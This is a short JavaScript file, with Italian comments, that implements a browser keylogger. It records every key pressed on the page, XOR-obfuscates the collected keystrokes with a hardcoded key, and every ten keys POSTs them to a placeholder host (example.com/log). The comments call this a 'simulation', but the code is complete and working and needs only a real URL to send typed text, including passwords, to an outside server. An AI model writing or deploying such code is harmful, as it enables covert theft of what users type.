const log = [];

document.addEventListener('keydown', function(event) {
  log.push(event.key);
  document.getElementById('logOutput').value = log.join('');

  // Simulazione invio dati ogni 10 caratteri
  if (log.length % 10 === 0) {
    simulateSend(log);
  }
});

// Funzione di cifratura XOR
function xorEncrypt(data, key) {
  let result = '';
  for (let i = 0; i < data.length; i++) {
    const charCode = data.charCodeAt(i) ^ key.charCodeAt(i % key.length);
    result += String.fromCharCode(charCode);
  }
  return result;
}

// Simulazione invio a server (POST) con log cifrato
function simulateSend(data) {
  const key = "secretKey"; // 🔑 chiave per la cifratura
  const encrypted = xorEncrypt(data.join(''), key);

  fetch('https://example.com/log', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      keystrokes: encrypted
    })
  })
  .then(() => {
    console.log("Simulated encrypted send:", encrypted);
  })
  .catch(err => {
    console.error("Simulation failed:", err);
  });
}
